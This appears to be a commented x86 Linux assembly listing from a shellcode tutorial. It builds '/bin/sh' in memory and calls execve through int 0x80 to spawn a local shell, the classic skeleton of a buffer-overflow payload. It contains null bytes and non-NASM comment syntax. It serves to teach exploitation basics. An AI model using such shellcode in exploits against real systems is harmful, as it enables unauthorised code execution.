segment .data
cheminshell db "/bin/shXAAAABBBB"

segment .text
 global _start
  _start:               #here we go
    mov eax,0           #EAX contains 0
    mov ebx,cheminshell #EBX has the address of the string
    mov [ebx+7],al      #[EBX+7] contains NULL terminates string
    mov [ebx+8],ebx     #[EBX+8] contains the second argument (so to the shell code)
    mov [ebx+12],eax    #[EBX+12] contains the third argument (here, environment variables set to NULL)
    lea ecx,[ebx+8]     #ECX pointer to execve’s arguments
    lea edx,[ebx+12]    #EDX contains empty env pointer
    mov eax,11          #Execve is interruption 11
    int 0x80            #Syscall 11